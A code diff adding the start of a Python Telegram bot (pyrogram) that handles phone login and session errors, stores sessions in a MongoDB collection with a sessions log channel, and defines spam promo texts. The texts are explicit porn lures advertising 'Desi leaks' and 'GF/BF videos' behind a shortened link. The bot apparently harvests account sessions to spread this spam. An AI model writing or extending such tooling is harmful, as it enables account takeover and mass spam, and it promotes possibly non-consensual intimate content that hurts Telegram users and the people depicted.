@@ -1,3 +1,47 @@
+import os
+import asyncio
+import time
+import random
+from pathlib import Path
+from pyrogram import Client, filters, enums
+from pyrogram.types import (
+    Message,
+    InlineKeyboardMarkup,
+    InlineKeyboardButton,
+    ReplyKeyboardMarkup,
+    KeyboardButton,
+    ReplyKeyboardRemove,
+    CallbackQuery
+)
+from pyrogram.errors import (
+    PhoneNumberInvalid,
+    PhoneCodeInvalid,
+    PhoneCodeExpired,
+    SessionPasswordNeeded,
+    PasswordHashInvalid,
+    FloodWait,
+    AuthKeyUnregistered,
+    SessionRevoked,
+    SessionExpired,
+    AuthKeyInvalid,
+    MessageIdInvalid,
+    NewSessionRequired,
+    FreshResetAuthorisationForbidden
+)
+from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
+from pymongo import MongoClient
+
+# MongoDB Setup
+mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
+database = mongo_client['Cluster0']['sessions']
+
+# Session Error List
+SESSION_ERRORS = (
+    AuthKeyUnregistered, SessionRevoked, SessionExpired,
+    AuthKeyInvalid, NewSessionRequired, FreshResetAuthorisationForbidden
+)
+
+# Promo Texts (10 unique messages)
 PROMO_TEXTS = [
     "🔥 10K+ horny Videos!! \n💦 Real Cum, No Filters \n💎 Ultra HD Uncut Scenes  \n🎁 No Cost — Click & Claim now! \n👉 http://bit.ly/hot_bot",
     "💋 Uncensored Desi Leaks! \n🔥 Real GF/BF Videos \n😍 Free Access Here \n👉 http://bit.ly/hot_bot",
